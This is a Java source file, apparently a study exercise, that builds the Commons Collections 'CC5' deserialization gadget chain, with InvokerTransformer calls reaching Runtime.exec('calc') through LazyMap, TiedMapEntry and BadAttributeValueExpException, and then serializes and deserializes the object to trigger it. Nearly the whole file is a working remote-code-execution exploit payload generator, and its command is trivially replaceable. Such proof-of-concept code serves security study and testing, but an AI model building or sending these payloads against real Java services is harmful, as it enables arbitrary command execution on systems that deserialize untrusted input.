package com.mechoy;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * Author  Mechoy
 * Version 1.0
 * Date    2023/3/31
 */
public class CC5Test {
    final static String path = "ser.bin";
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        });

        HashMap<Object, Object> map = new HashMap<>();
        // 先传个没啥用的，后面再改
        Map lazyMap = LazyMap.decorate(map,new ConstantTransformer("q"));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "111");

        Class aClass = LazyMap.class;
        Field factory = aClass.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap,chainedTransformer);

        // 因为在构造器时也会掉toString，所以这里也是先造个没啥用的TiedMapEntry，后面再反射把有用的替换进去
        TiedMapEntry tiedMapEntry1 = new TiedMapEntry(LazyMap.decorate(map, new ConstantTransformer("q")), 222);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(tiedMapEntry1);

        Field val = badAttributeValueExpException.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException,tiedMapEntry);

        serialize(badAttributeValueExpException);
        deserialize();
    }

    public static void serialize(Object obj) throws IOException {
        FileOutputStream fos = new FileOutputStream(path);
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(obj);
    }

    public static Object deserialize() throws IOException, ClassNotFoundException {
        FileInputStream fis = new FileInputStream(path);
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object o = ois.readObject();
        return o;
    }
}
